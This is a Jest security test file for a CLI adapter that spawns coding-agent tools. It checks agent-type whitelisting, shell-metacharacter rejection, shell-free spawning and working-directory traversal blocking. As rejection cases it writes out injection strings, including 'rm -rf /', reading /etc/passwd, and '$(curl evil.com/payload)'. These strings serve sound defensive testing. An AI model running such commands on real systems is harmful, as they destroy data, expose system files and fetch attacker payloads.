/**
 * Security tests for CLI adapter command injection fix.
 *
 * Covers:
 * - agentType whitelist validation
 * - prompt shell metacharacter rejection (npm/npx)
 * - edge cases: empty, undefined, malformed inputs
 */

import { CLIAdapter } from '../adapters/cli-adapter';

// We need to mock child_process.spawn to avoid actually executing commands.
// The adapter itself validates inputs before reaching spawn.
jest.mock('child_process', () => ({
  spawn: jest.fn(() => ({
    stdout: { on: jest.fn() },
    stderr: { on: jest.fn() },
    on: jest.fn((event: string, cb: () => void) => {
      if (event === 'close') setTimeout(cb, 0);
    }),
    kill: jest.fn(),
    killed: false,
  })),
}));

jest.mock('which', () => ({
  __esModule: true,
  default: jest.fn(() => Promise.resolve('/usr/local/bin/codex')),
}));

import { spawn } from 'child_process';

const mockedSpawn = spawn as jest.MockedFunction<typeof spawn>;

function createTestAdapter(): CLIAdapter {
  const configs = new Map<string, { enabled: boolean; path?: string }>([
    ['codex', { enabled: true }],
    ['pi', { enabled: true }],
    ['acp', { enabled: true }],
    ['npm', { enabled: true }],
    ['npx', { enabled: true }],
  ]);
  return new CLIAdapter(configs);
}

const baseRequest = {
  cwd: '/tmp/test-project',
  prompt: 'fix the bug in auth module',
};

// ============================================================

describe('CLIAdapter - agentType whitelist', () => {
  it('rejects unknown agentType', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({ ...baseRequest, agentType: 'malicious-agent' as any })
    ).rejects.toThrow('Forbidden agent type');
  });

  it('rejects agentType with path traversal', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({ ...baseRequest, agentType: '../../../usr/bin/rm' as any })
    ).rejects.toThrow('Forbidden agent type');
  });

  it('rejects empty agentType', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({ ...baseRequest, agentType: '' as any })
    ).rejects.toThrow('Forbidden agent type');
  });

  it('accepts all allowed agentTypes', async () => {
    const adapter = createTestAdapter();
    const allowedTypes = ['codex', 'pi', 'acp', 'npm', 'npx'];

    for (const agentType of allowedTypes) {
      // spawn returns a mock that auto-closes, so execute resolves
      await expect(
        adapter.execute({ ...baseRequest, agentType: agentType as any })
      ).resolves.toBeDefined();
    }
  });
});

describe('CLIAdapter - prompt shell injection prevention', () => {
  it('rejects prompt with semicolon injection for npm', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npm' as any,
        prompt: 'install; rm -rf /',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects prompt with pipe injection for npm', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npm' as any,
        prompt: 'install | cat /etc/passwd',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects prompt with backtick injection for npx', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npx' as any,
        prompt: 'run `rm -rf /`',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects prompt with command substitution for npm', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npm' as any,
        prompt: 'install $(curl evil.com/payload)',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects prompt with redirect for npx', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npx' as any,
        prompt: 'run > /etc/passwd',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects empty prompt for npm', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npm' as any,
        prompt: '',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('rejects whitespace-only prompt for npx', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npx' as any,
        prompt: '   ',
      })
    ).rejects.toThrow('shell metacharacters');
  });

  it('accepts safe npm prompt', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npm' as any,
        prompt: 'install lodash',
      })
    ).resolves.toBeDefined();
  });

  it('accepts safe npx prompt', async () => {
    const adapter = createTestAdapter();
    await expect(
      adapter.execute({
        ...baseRequest,
        agentType: 'npx' as any,
        prompt: 'create-react-app my-app',
      })
    ).resolves.toBeDefined();
  });
});

describe('CLIAdapter - spawn isolation', () => {
  it('never passes shell=true to spawn (non-Windows)', async () => {
    const adapter = createTestAdapter();
    mockedSpawn.mockClear();

    await adapter.execute({
      ...baseRequest,
      agentType: 'codex' as any,
    });

    expect(mockedSpawn).toHaveBeenCalledTimes(1);
    const spawnArgs = mockedSpawn.mock.calls[0];
    const options = spawnArgs?.[2] as Record<string, unknown> | undefined;
    expect(options?.['shell']).toBe(false);
  });
});

describe('CLIAdapter - cwd path traversal prevention', () => {
  function createRestrictedAdapter(): CLIAdapter {
    const configs = new Map<string, { enabled: boolean; path?: string }>([
      ['codex', { enabled: true }],
    ]);
    return new CLIAdapter(configs, ['/workspace', '/projects']);
  }

  it('rejects path traversal to /etc', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({ cwd: '../../../../etc', prompt: 'ls', agentType: 'codex' as any })
    ).rejects.toThrow('Working directory not allowed');
  });

  it('rejects absolute path outside allowed bases', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({ cwd: '/etc', prompt: 'ls', agentType: 'codex' as any })
    ).rejects.toThrow('Working directory not allowed');
  });

  it('rejects path traversal to /usr', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({ cwd: '/tmp/../../../usr/bin', prompt: 'ls', agentType: 'codex' as any })
    ).rejects.toThrow('Working directory not allowed');
  });

  it('rejects empty cwd', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({ cwd: '', prompt: 'ls', agentType: 'codex' as any })
    ).rejects.toThrow('Working directory is required');
  });

  it('accepts path within allowed base', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({ cwd: '/workspace/my-project', prompt: 'fix bug', agentType: 'codex' as any })
    ).resolves.toBeDefined();
  });

  it('accepts path with subdirectories in allowed base', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({
        cwd: '/projects/agent-orchestration/frontend',
        prompt: 'build',
        agentType: 'codex' as any,
      })
    ).resolves.toBeDefined();
  });

  it('normalizes dot-segments in allowed base', async () => {
    const adapter = createRestrictedAdapter();
    await expect(
      adapter.execute({
        cwd: '/workspace/../workspace/project',
        prompt: 'build',
        agentType: 'codex' as any,
      })
    ).resolves.toBeDefined();
  });

  it('passes resolved cwd to spawn (not the raw input)', async () => {
    const adapter = createRestrictedAdapter();
    mockedSpawn.mockClear();

    await adapter.execute({
      cwd: '/workspace/../workspace/project',
      prompt: 'build',
      agentType: 'codex' as any,
    });

    const spawnArgs = mockedSpawn.mock.calls[0];
    const options = spawnArgs?.[2] as Record<string, unknown> | undefined;
    // The raw input had ".." but it should be resolved
    expect(options?.['cwd']).toBe('/workspace/project');
  });

  it('uses custom allowedBasePaths when provided', async () => {
    const configs = new Map<string, { enabled: boolean; path?: string }>([
      ['codex', { enabled: true }],
    ]);
    const adapter = new CLIAdapter(configs, ['/opt/app']);

    await expect(
      adapter.execute({ cwd: '/opt/app/service', prompt: 'start', agentType: 'codex' as any })
    ).resolves.toBeDefined();

    await expect(
      adapter.execute({ cwd: '/tmp', prompt: 'ls', agentType: 'codex' as any })
    ).rejects.toThrow('Working directory not allowed');
  });
});
